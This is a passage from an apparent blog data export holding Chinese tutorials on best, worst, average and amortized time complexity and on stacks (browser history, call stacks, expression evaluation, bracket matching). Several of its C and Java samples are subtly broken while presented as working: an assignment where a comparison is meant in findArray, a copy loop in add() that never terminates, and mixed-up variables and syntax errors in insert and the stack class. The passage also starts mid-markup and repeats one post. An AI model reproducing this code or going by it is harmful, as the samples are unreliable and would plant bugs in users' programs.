class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">findArray</span><span class=\"params\">(<span class=\"keyword\">int</span>[] arr, <span class=\"keyword\">int</span> n, <span class=\"keyword\">int</span> target)</span></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> i = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> pos = <span class=\"number\">-1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span>(i; i&lt;n; i++)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(arr[i] = target)&#123;</span><br><span class=\"line\">      pos = i;</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> pos;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>但是这时候问题来了，优化完之后，时间复杂度还是O(n)吗？</p>\n<p>因为要查找的变量target可能出现在数组的任何位置，如果要查找的target刚好出现在数组的开始位置，那么就不需要遍历剩余的数据，此时时间复杂度为O(1)。但是如果数组中不存在变量target，或者在最后一位，那我们就需要把整个数组都遍历一遍，时间复杂度就成了O(n)，所以这段代码在不同情况下时间复杂度是不同的。</p>\n<p>为了表示代码在不同情况下的时间复杂度，我们需要引入三个概念：<strong>最好情况时间复杂度、最坏情况复杂度、平均时间复杂度</strong>。</p>\n<p>顾名思义，最好情况时间复杂度就是，在最理想情况下，执行这段代码的时间复杂度。如上例中，在最理想情况下，查找的变量target刚好在第一个，这时候对应的时间复杂度就是最好情况时间复杂度。</p>\n<p>同理，最坏情况时间复杂度就是，在最糟糕的情况下，执行这段代码的时间复杂度，上例中，如果数组中没有要查找的变量target，我们需要把整个数组遍历一遍，所以最坏情况下对应的时间复杂度就是最坏情况复杂度。</p>\n<p><div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"平均时间复杂度\"><a href=\"#平均时间复杂度\" class=\"headerlink\" title=\"平均时间复杂度\"></a>平均时间复杂度</h3></div><br></div><br>我们都知道，最好情况时间复杂度和最坏情况时间复杂度对应的都是极端情况下的代码复杂度，发生的概率并不大。为了更好的表示平均情况下的时间复杂度，我们引入一个概念：<strong>平均情况时间复杂度，简称平均时间复杂度</strong>。</p>\n<p>平均时间复杂度又该怎么分析呢？我们还是借助上面的例子。</p>\n<p>要查找的变量target在数组中的位置，有n+1中情况： 在数组0 ~ n-1位置 n种情况和不在数组中1个情况。我们把每种情况下，需要遍历的元素个数累加起来，然后在除以n+1，就可以得到需要遍历的元素个数的平均值，即：</p>\n<p>$$ \\frac{1+2+3+…+n+n}{n+1} = \\frac{n(n + 3)}{2(n + 1)} $$</p>\n<p>我们知道，时间复杂度大O标记法中，可以省略掉系数、低阶、常量，所以上面的时间复杂度为O(n)。</p>\n<p>这个结论虽然是正确的，但是计算过程稍微有点问题。我们刚讲的这n+1中情况，出现的概率并不一样。下面结合概率论的知识分析一下。</p>\n<p>我们知道，要查找的变量x，要么在数组中，要么不再数组中，我们假设这两个概率分布为$\\frac{1}{2}$。</p>\n<p>不在数组中时，时间复杂度为: <font color=\"red\">$n\\times\\frac{1}{2}$</font>; 在数组中时，因为数组大小为n，出现在任何一个位置的可能性都是一样的，所以每个位置的概率就是:<font color=\"red\">$\\frac{1}{2n}$</font>, 因此在数组中时的时间复杂度为：<font color=\"red\">$(1+2+3+…+n)\\times\\frac{1}{2n} $</font>。</p>\n<p>那平均时间复杂度就是：<font color=\"red\">$(1+2+3+…+n)\\times\\frac{1}{2n} + n\\times\\frac{1}{2} = \\frac{3n+1}{4} = O(n)$</font>。</p>\n<p>这个值就是概率论中的加权平均值，也叫做期望值，所以平均时间复杂度也叫做<strong>加权平均时间复杂度</strong>或者<strong>期望时间复杂度</strong>。</p>\n<p>实际上，在大多情况下我们并不需要区分最好、最坏、平均时间复杂度三种情况，很多时候我们只用一个复杂度就可以满足需求了。只有同一代码在不同的情况下，时间复杂度有量级的差距，我们才会使用三种复杂度表示法来区分。</p>\n<p><div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"均摊时间复杂度\"><a href=\"#均摊时间复杂度\" class=\"headerlink\" title=\"均摊时间复杂度\"></a>均摊时间复杂度</h3></div><br></div><br>目前为止，我们应该已经掌握了算法复杂度分析的大部分内容了，下面来认识一个更高级的概念：<strong>均摊时间复杂度</strong>，以及它对应的分析方法<strong>摊还分析</strong>。</p>\n<p>均摊时间复杂度听起来跟平均时间复杂度有点像，对于初学者来说，这两个概念很容易弄混。前面说过，大部分情况下不需要区分最好、最坏、平均时间复杂度，只有某些特殊情况才需要平均时间复杂度，而均摊时间复杂度比它的应用场景比它更特殊、更有限。</p>\n<p>还是以一个例子来说明(别太在意例子，只是为了说明)：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span>[] arr = <span class=\"keyword\">new</span> <span class=\"keyword\">int</span>[n];</span><br><span class=\"line\"><span class=\"keyword\">int</span> size = <span class=\"number\">0</span>；</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">void</span> insert(<span class=\"keyword\">int</span> val)&#123;</span><br><span class=\"line\">  <span class=\"comment\">// 如果数组满了</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span>(count == arr.length)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> sum = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>; i&lt;arr.length;i++)&#123;</span><br><span class=\"line\">      sum = sum + arr[i];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    arr[<span class=\"number\">0</span>] = sum;</span><br><span class=\"line\">    count = <span class=\"number\">1</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"comment\">// 数组赋值</span></span><br><span class=\"line\">  arr[count] = val;</span><br><span class=\"line\">  ++count;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>先简单解释一下这段代码的功能，这段代码实现了一个往数组中插入数据的功能，如果数组有空闲空间，直接插入即可。如果数组满了，将数组中的数据求和，清空数组，将求和之后的数据放入数组的第一个位置，然后再将新的数据插入。</p>\n<p>那这段代码的时间复杂度是多少呢？我们可以先利用上面讲的三种分析方法来分析一下。</p>\n<p>最理想情况下，数组有空闲空间，直接插入数据就可以，所以最好时间复杂度为O(1)；最坏情况下，数组中没有空闲空间了，我们需要先进行一次数组遍历求和，在做数据插入，所以最坏情况时间复杂度为O(n)；平均情况时间复杂度，我们还是用概率论的方法来分析，假设数组长度为n，根据插入位置不同，可以分为n种情况，每种情况的时间复杂度为O(1)，另外还有一种特殊情况，就是数组没有空闲时间时，时间复杂度为O(n)，而且这n+1中情况出现的概率是一样的，所以根据加权平均的计算方法，求得平均时间复杂度为：$ 1\\times\\frac{1}{n+1} + 1\\times\\frac{1}{n+1} + 1\\times\\frac{1}{n+1} +….+ 1\\times\\frac{1}{n+1} + n\\times\\frac{1}{n+1} = O(1) $。</p>\n<p>我们来比较一下这个例子中insert函数和上面findArray的不同。首先，findArray在极端情况下，复杂度才为O(1)，大部分情况都为O(n)，而insert函数大部分情况时间复杂度都为O(1)，只有特殊情况时间复杂度才为O(n)，这是第一个区别。第二个不同的地方，对于insert函数来说，O(1)和O(n)的时间复杂度出现的频率是非常有规律的，而且有一定的时序关系，一般都是一个O(n)插入之后，跟n-1个O(1)的插入操作，循环往复。</p>\n<p>针对这样一种情况，我们并不需要像平均复杂度分析那样，计算所有输入情况和发生的概率，计算加权平均值。 我们引入一种更加简单的分析方法：<strong>摊还分析法</strong>，通过摊还分析得到的时间复杂度我们起了一个名字叫：<strong>摊还时间复杂度</strong>。</p>\n<p>那么究竟如何使用摊还分析法来分析算法的均摊时间复杂度呢？</p>\n<p>我们还是以这个insert函数为例，每一次O(n)的插入操作，后面都会跟n-1次O(1)插入操作，所以我们把耗时最多的操作均摊到n-1次耗时少的操作上，均摊下来，这一组连续操作的均摊时间复杂度就为O(1)，这就是均摊分析法的大致思路。</p>\n<p>均摊时间复杂度和摊还分析应用场景比较特殊，所以不会经常用到，这里简单总结一下他们的应用场景。</p>\n<p>对一个数据结构进行一组连续操作中，大部分情况下时间复杂度都很低，只有个别情况下时间复杂度比较高，而且这些操作之间存在前后连贯的时序关系，这个时候，我们就可以将这一组操作放在一块分析，看看是否能将时间复杂度高的操作，均摊到其他时间复杂度低的操作上。在一般的能运用均摊时间复杂度的场景中，均摊时间复杂度是等于最好时间复杂度的。</p>\n<h3 id=\"思考题：\"><a href=\"#思考题：\" class=\"headerlink\" title=\"思考题：\"></a>思考题：</h3><p>根据今天学习的几个复杂度分析的方法，来分析一下下面这个add()函数的时间复杂度。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span>[] arr = <span class=\"keyword\">new</span> <span class=\"keyword\">int</span>[<span class=\"number\">10</span>];</span><br><span class=\"line\"><span class=\"keyword\">int</span> len = <span class=\"number\">10</span>;</span><br><span class=\"line\"><span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">add</span><span class=\"params\">(<span class=\"keyword\">int</span> element)</span></span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// 数组空间满了</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span>(i&gt;=len)&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 数组扩容</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> new_arr = <span class=\"keyword\">new</span> <span class=\"keyword\">int</span>[len*<span class=\"number\">2</span>];</span><br><span class=\"line\">    <span class=\"comment\">// 把数组拷贝到新数组</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> j=<span class=\"number\">0</span>; i&lt;len; j++)&#123;</span><br><span class=\"line\">      new_arr[j] = arr[j];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    arr = new_arr;</span><br><span class=\"line\">    len = len*<span class=\"number\">2</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"comment\">// 添加到数组中</span></span><br><span class=\"line\">  arr[i] = element;</span><br><span class=\"line\">  ++i;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>分析：</strong>在最理想情况下，数组中有空闲空间，可以直接添加到数组中，时间复杂度为O(1)；最坏情况下，数组中没有空闲空间，先进行一次扩容操作，在进行遍历给新数组赋值，时间复杂度为O(n)，所以最坏时间复杂度为O(n)。</p>\n<p>平均时间复杂度，可以分为有空闲空间和没有空闲空间两种，有空间空间有n中情况，所以每种情况出现的概率为$\\frac{1}{n+1}$，所以根据加权平均的计算方法，求得平均时间复杂度为：$ 1\\times\\frac{1}{n+1} + 1\\times\\frac{1}{n+1} + 1\\times\\frac{1}{n+1} +….+ 1\\times\\frac{1}{n+1} + n\\times\\frac{1}{n+1} = O(1) $。</p>\n<p>均摊时间复杂度，可以看出本例是符合均摊时间复杂度的场景的，在一次O(n)时间复杂度操作后都会跟n-1次O(1)时间复杂度操作，所以将O(n)时间复杂度的操作均摊到n-1次O(1)时间复杂度操作上，最终均摊时间复杂度为O(1)。</p>\n<p><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"算法-栈","date":"2018-09-14T16:18:36.000Z","_content":"\n<div style=\"text-align: center;\">\n{% note success %} \n### 前言\n{% endnote %}\n</div>\n\n浏览器的前进、后退功能，我想你肯定很熟悉吧？\n\n当你依次访问完一连串页面a-b-c-d之后，点击浏览器的后退按钮，就可以查看之前浏览过的页面c-b-a。当后退到a页面之后，点击前进按钮，可以重新进入页面b-c-d。但是如果进入页面b之后，点击了两一个页面，那就无法通过前进后退页面进入c-d了。\n\n假如你是浏览器的开发设计者，你会如何实现这个功能呢？带着这个问题，我们来看一下“栈”这个数据结构。\n\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 如何理解栈？\n{% endnote %}\n</div>\n\n关于栈，举一个非常贴切的例子。比如叠盘子，我们放盘子的时候都是从下往上一个一个放。取的时候，我们也是从上往下一个一个取，不能从中间抽取。**先进者后出，后进者先出，这就是典型的栈结构**。\n\n从栈的操作特性上来看，**栈是一种操作受限的线性表**，只允许在一端插入和删除数据。\n\n我第一次接触这种数据结构的时候，就对它存在的意义产生了很大的疑惑。因为相比数组和链表，栈带给我的只有限制，并没有任何优势。那我直接使用数组或者链表就好了？为什么还要用这个“操作受限”的数据结构呢？\n\n事实上，从功能上来说，数组和链表确实可以代替栈，但是你要知道，特定的数据结构是对特定场景的抽象，而且数组和链表暴露了太多的操作接口，操作上的确灵活自由，但使用时就比较不可控，自然就更容易出错。\n\n**当某个数据集合只涉及在一端插入和删除数据时，并且满足先进后出、后进先出的特性，我们就应该用栈这种数据结构**。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 如何实现一个栈？\n{% endnote %}\n</div>\n\n从刚才栈的定义里可以看出，栈主要包含两个操作，入栈和出栈。也就是在在栈顶插入一个数据和从栈顶删除一个数据。理解了栈的定义之后，我们来看一看如何用代码实现一个栈。\n\n实际上，栈可以用数组来实现，也可以用链表来实现。用数组实现的栈，我们叫做**顺序栈**，用链表实现的栈，我们叫做**链式栈**。\n\n\n#### 基于数组实现的顺序栈\n\n我这里用Java实现一个基于数组的顺序栈，基于链表的实现，可以自己写一下。\n\n```java\n// 基于数组实现的链式栈\npublic class ArrayStack<T> implements stack<T> {\n    private final Object [] DEFAULT_ARRAY = new Object[10];\n    private final int DEFAULT_CAP = 10;\n    private Object[] data;\n    private int  cap;\n    private int size;\n\n    public ArrayStack() {\n        this.cap = DEFAULT_CAP;\n        this.size = 0;\n        this.data = DEFAULT_ARRAY;\n    }\n    public ArrayStack(int cap){\n        if (cap < 0) throw new IllegalArgumentException(\"Illegal Capacity: \"+ cap);\n        this.cap = cap;\n        this.data = new Object[cap];\n    }\n    public void push(T val) {\n        if (size<cap){\n            // 数组满了\n            data[size] = val;\n            size++;\n        }else {\n          throw new Runtime(\"stack is full!\")\n          // 可以动态扩容的stack\n          // Object[] objects = new Object[cap*2];\n          // System.arraycopy(data, 0, objects, 0, size);\n          // data = objects;\n          // data[size] = val;\n          // size ++;\n        }\n    }\n    public T pop() {\n        if (size == 0) return null;\n        T result = (T) data[size-1];\n        size--;\n        return result;\n    }\n}\n\n```\n\n了解了定义和基本操作，那它的操作时间、空间复杂度是多少呢？\n\n不管是链式栈还是顺序栈，我们存储数据需要一个大小为n的数组就够了。在入栈和出栈的过程中，只需要一两个临时变量存储空间，因此时间复杂度是O(1)。\n\n注意这里存储数据需要一个大小为n的数组，并不是说空间复杂度是O(n)，因为这n个空间是必须的，无法省掉。所以我们说空间复杂度的时候，是指除了原本的数据存储空间外，算法运行还需要额外的存储空间。\n\n时间复杂度分析：不管是入栈、出栈，都只涉及栈顶个别数据的操作，因此时间复杂度为O(1)。\n\n#### 支持动态扩容的顺序栈\n\n刚才那个基于数组实现的顺序栈，是一个固定大小的栈，也就是说，在初始化后需要实现指定栈的大小，当栈满之后，就无法在王栈里添加数据了，尽管链式栈的大小不受限，但是要存储next指针，内存消耗相对较多。那我们如何实现一个可以支持动态扩容的栈呢？\n\n还记得，在数组那一节，要如何来实现一个支持动态扩容的数组吗？当数组空间不足时，我们重新申请一块更大的内存，将原来数组中的数据拷贝过去，这样就实现了一个支持动态扩容的数组。\n\n所以，如果实现一个支持动态扩容的栈，我们只需要底层依赖一个支持动态扩容的数组就可以了。当栈满了之后，我们就申请一个更大的数组，将原来的数据搬移到新的数组中。\n\n\n实际上，支持动态扩容的顺序栈，我们开发中并不经常用到。这块我们复习一下复杂度分析方法。现在我们来分析一下支持动态扩容的顺序栈的入栈、出栈时间复杂度。\n\n对于出栈操作来说，不会涉及到内存的重新申请和数据搬移，所以出栈的时间复杂度仍然是O(1)。但是对于入栈操作来说，情况就不一样了，当栈中有空闲空间时，入栈操作时间复杂度为O(1)，当栈中没有空间不够时，就需要重新申请内存和数据搬移，所以时间复杂度就变成了O(n)。\n\n也就是说，对于入栈操作来说，最好时间复杂度为O(1)，最坏情况时间复杂度为O(n)。那平均情况下的时间复杂度是多少呢？还记得时间复杂度分析方法中的摊还分析法吗？这个入栈操作的平均情况的时间按复杂度正好可以用摊还分析法来分析。\n\n为了分析方便，我们先做一些假设和定义：\n* 栈空间不够时，我们重新申请一个是原来大小两倍的数组；\n* 为了简化分析，假设只有入栈操作没有出栈操作；\n* 定义不涉及内存搬移操作的入栈操作为simple-push操作，时间复杂度为O(1)。\n\n如果当前栈大小为K，并且已满，当在有新的的数据要入栈时，就需要重新申请2倍大小的内存，并且做K个数据的搬移操作，然后在入栈。但是，接下来的K-1次入栈操作，我们都不需要在重新申请内存和搬移数据，所以这k-1次都只需要一次simple-push操作就可以完成。如下图：\n\n{% asset_img 入栈时间复杂度.jpg %}\n\n从上图看出，这K次入栈操作，总共涉及了K个数据的搬移，以及K次simple-push操作。讲K个数据搬移均摊到K次入栈操作，那每个入栈操作只需要一个数据搬移和一个simpel-push操作。以此类推，入栈操作的时间复杂度为O(1)。\n\n通过这个例子分析，也验证了前面讲的，均摊时间复杂度一般都等于最好时间复杂度。因为在大部分情况下，入栈操作的时间复杂度都是O(1)，只有在个别情况才会退化为O(n)，所以把耗时多的入栈操作的时间均摊到其他入栈操作上，平均情况下耗时就接近O(1)。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 栈的应用场景\n{% endnote %}\n</div>\n\n#### 栈在函数调用中的应用\n\n前面讲的都比较偏理论，我们现在来看，栈在软件工程中的实际应用。栈作为一个比较基础的数据结构，应用场景还是蛮多的。其中比较经典的一个应用场景就是函数调用栈。\n\n我们知道，操作系统给每个线程分配了一块独立的内存空间，这块内存空间被组织成“栈”这种结构，用来存储函数调用时的临时变量。每进入一个函数，就会将临时变量作为一个栈帧入栈，当被调用函数执行完成，返回之后，将这个函数对应的栈帧出栈。为了更好理解函数调用栈，一起来看一下这段代码的执行过程。\n\n```C\nint main(){\n  int a = 1;\n  int ret = 0;\n  int res = 0;\n  ret = add(3,5);\n  res = a + ret;\n  printf(\"%d\", res);\n  return 0;\n}\n\nint add(int x, int y){\n  int sum = 0;\n  sum = x + y;\n  return sum;\n}\n```\n\n从代码中我们可以看出，main函数调用了add函数，获取计算结果，并且与临时变量a相加，最后打印res的值，为了清晰的看到这个过程的函数栈里对应的入栈、出栈过程，我这里画了一张函数栈图：\n\n{% asset_img 函数栈.jpg %}\n\n#### 栈在表达式求值中的应用\n\n我们再来看一个栈的常见应用场景，编译器如何利用栈实现**表达式求值**。\n\n这里我们用一个只包含加减乘除四则运算的表达式来解释，比如：34+13\\*9+44-12/3。对于这个四则运算，我们人脑可以很快算出来，但是对于计算机来说，理解这个表达式本身就是个挺难的事。如果是你，你会怎么实现一个表达式求值的功能呢？\n\n实际上，编译器就是通过两个栈来实现的。其中一个是保存操作数的栈，另一个保存运算符的栈。我们从左往右遍历表达式，当遇到数字，我们直接压入操作数栈。当遇到运算符，就与运算符的栈顶元素进行比较。如果运算符比当前栈顶元素的优先级高，就直接压入运算符栈中，如果比栈顶元素的优先级低或者相同，就将当前栈顶元素取出，再从操作数栈中取出两个操作数，然后进行运算，再把计算完的结果压入操作数栈，继续比较。\n\n这里用一个简单的例子：3+5\\*8-6 我将这个表达式的计算过程画成一个图，结合图来理解刚才的计算过程。\n\n{% asset_img 表达式栈图.jpg %}\n\n#### 栈在括号匹配中的应用\n\n出了用栈来实现表达式求值，我们还可以借助栈来检查表达式中的括号是否匹配。\n\n我们同样简化一下背景，假设表达式只包含三种括号，圆括号()、方括号[]、花括号{}，并且他们可以任意嵌套。比如{[{}]}、[([]){()}]等都为合法格式，而{[}()或[{(}]为非法格式。那现在给你一个包含三种括号的表达式字符串，如何检查它是否合法呢？\n\n这里也可以用栈来解决。我们用栈来保存未匹配的左括号，从做到右一次扫描字符串。当扫描到左括号时，则将其压入栈中，当扫描到右括号时，从栈顶取出一个左括号。如果能够匹配，比如\"(\"和\")\"匹配、\"[\"和\"]\"匹配、\"{\"和\"}\"匹配，则继续扫描剩下的字符串。如果扫描过程中，遇到不能匹配的右括号，或者栈中没有数据，则说明为非法格式。\n\n当所有的括号都扫描完成后，如果栈为空，则说明字符串为合法格式；否则说明有为匹配的左括号，为非法格式。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 解答开篇\n{% endnote %}\n</div>\n\n好了，理解了栈的概念和应用，再回头看看开篇的问题。如何实现浏览器的前进、后退功能？学过栈之后，就可以用两个栈完美的解决这个问题了。\n\n我们使用两个栈X、Y，把首次浏览的页面压入栈X，当点击后退按钮时，依次从栈X中出栈，并将出栈的数据依次放入栈Y。当我们点击前进按钮时，依次取出栈Y中的数据，并放入栈X。当X中没有数据时，说明没有页面可以后退了。当Y中没有数据时，说明没有页面可以点击前进按钮进行浏览了。\n\n当我们依次浏览了a、b、c三个页面，我们依次把a、b、c压入栈，这个时候，两个栈的数据就是如下这个样子：\n\n{% asset_img 浏览器栈1.jpg %}\n\n当我们通过浏览器的后退按钮，从页面c后退到页面a之后，我们依次把c、b从栈X中弹出，并且依次放入栈Y中，这个时候栈中的数据就是如下：\n\n{% asset_img 浏览器栈2.jpg %}\n\n这时候，又想看页面b，于是点击前进按钮回到b页面，我们就把b再从栈Y中取出，放入X，此时栈中数据如下：\n\n{% asset_img 浏览器栈3.jpg %}\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 总结\n{% endnote %}\n</div>\n\n栈是一种操作受限的数据结构，只支持入栈和出栈操作。后进先出是它的最大特点。栈既可以通过数组来实现，也可以通过链表来实现。不管是数组实现的栈，还是链表实现的栈，他们的入栈、出栈时间复杂度都为O(1)。在基于数组实现的动态扩容的顺序栈中，时间复杂度均为O(1)，重点是入栈时间复杂度中关于摊还分析法的掌握。\n\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 思考\n{% endnote %}\n</div>\n\n1、再讲栈的应用时，讲到用函数调用栈来保存临时变量，为什么函数调用要用\"栈\"这种数据结构来保存临时变量呢？用其他数据结构可以吗？\n2、我们知道，JVM内存管理中有个“堆栈”的概念。栈内存用来白村局部变量和方法调用，堆内存用来存储java中的对象。那JVM里面的“栈”和我们这里的“栈”一样吗？不一样的话，为什么叫“栈”呢？\n\n<br>\n","source":"_posts/算法-栈.md","raw":"---\ntitle: 算法-栈\ndate: 2018-09-15 00:18:36\ntags: ['算法','栈']\ncategories: 算法\n---\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 前言\n{% endnote %}\n</div>\n\n浏览器的前进、后退功能，我想你肯定很熟悉吧？\n\n当你依次访问完一连串页面a-b-c-d之后，点击浏览器的后退按钮，就可以查看之前浏览过的页面c-b-a。当后退到a页面之后，点击前进按钮，可以重新进入页面b-c-d。但是如果进入页面b之后，点击了两一个页面，那就无法通过前进后退页面进入c-d了。\n\n假如你是浏览器的开发设计者，你会如何实现这个功能呢？带着这个问题，我们来看一下“栈”这个数据结构。\n\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 如何理解栈？\n{% endnote %}\n</div>\n\n关于栈，举一个非常贴切的例子。比如叠盘子，我们放盘子的时候都是从下往上一个一个放。取的时候，我们也是从上往下一个一个取，不能从中间抽取。**先进者后出，后进者先出，这就是典型的栈结构**。\n\n从栈的操作特性上来看，**栈是一种操作受限的线性表**，只允许在一端插入和删除数据。\n\n我第一次接触这种数据结构的时候，就对它存在的意义产生了很大的疑惑。因为相比数组和链表，栈带给我的只有限制，并没有任何优势。那我直接使用数组或者链表就好了？为什么还要用这个“操作受限”的数据结构呢？\n\n事实上，从功能上来说，数组和链表确实可以代替栈，但是你要知道，特定的数据结构是对特定场景的抽象，而且数组和链表暴露了太多的操作接口，操作上的确灵活自由，但使用时就比较不可控，自然就更容易出错。\n\n**当某个数据集合只涉及在一端插入和删除数据时，并且满足先进后出、后进先出的特性，我们就应该用栈这种数据结构**。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 如何实现一个栈？\n{% endnote %}\n</div>\n\n从刚才栈的定义里可以看出，栈主要包含两个操作，入栈和出栈。也就是在在栈顶插入一个数据和从栈顶删除一个数据。理解了栈的定义之后，我们来看一看如何用代码实现一个栈。\n\n实际上，栈可以用数组来实现，也可以用链表来实现。用数组实现的栈，我们叫做**顺序栈**，用链表实现的栈，我们叫做**链式栈**。\n\n\n#### 基于数组实现的顺序栈\n\n我这里用Java实现一个基于数组的顺序栈，基于链表的实现，可以自己写一下。\n\n```java\n// 基于数组实现的链式栈\npublic class ArrayStack<T> implements stack<T> {\n    private final Object [] DEFAULT_ARRAY = new Object[10];\n    private final int DEFAULT_CAP = 10;\n    private Object[] data;\n    private int  cap;\n    private int size;\n\n    public ArrayStack() {\n        this.cap = DEFAULT_CAP;\n        this.size = 0;\n        this.data = DEFAULT_ARRAY;\n    }\n    public ArrayStack(int cap){\n        if (cap < 0) throw new IllegalArgumentException(\"Illegal Capacity: \"+ cap);\n        this.cap = cap;\n        this.data = new Object[cap];\n    }\n    public void push(T val) {\n        if (size<cap){\n            // 数组满了\n            data[size] = val;\n            size++;\n        }else {\n          throw new Runtime(\"stack is full!\")\n          // 可以动态扩容的stack\n          // Object[] objects = new Object[cap*2];\n          // System.arraycopy(data, 0, objects, 0, size);\n          // data = objects;\n          // data[size] = val;\n          // size ++;\n        }\n    }\n    public T pop() {\n        if (size == 0) return null;\n        T result = (T) data[size-1];\n        size--;\n        return result;\n    }\n}\n\n```\n\n了解了定义和基本操作，那它的操作时间、空间复杂度是多少呢？\n\n不管是链式栈还是顺序栈，我们存储数据需要一个大小为n的数组就够了。在入栈和出栈的过程中，只需要一两个临时变量存储空间，因此时间复杂度是O(1)。\n\n注意这里存储数据需要一个大小为n的数组，并不是说空间复杂度是O(n)，因为这n个空间是必须的，无法省掉。所以我们说空间复杂度的时候，是指除了原本的数据存储空间外，算法运行还需要额外的存储空间。\n\n时间复杂度分析：不管是入栈、出栈，都只涉及栈顶个别数据的操作，因此时间复杂度为O(1)。\n\n#### 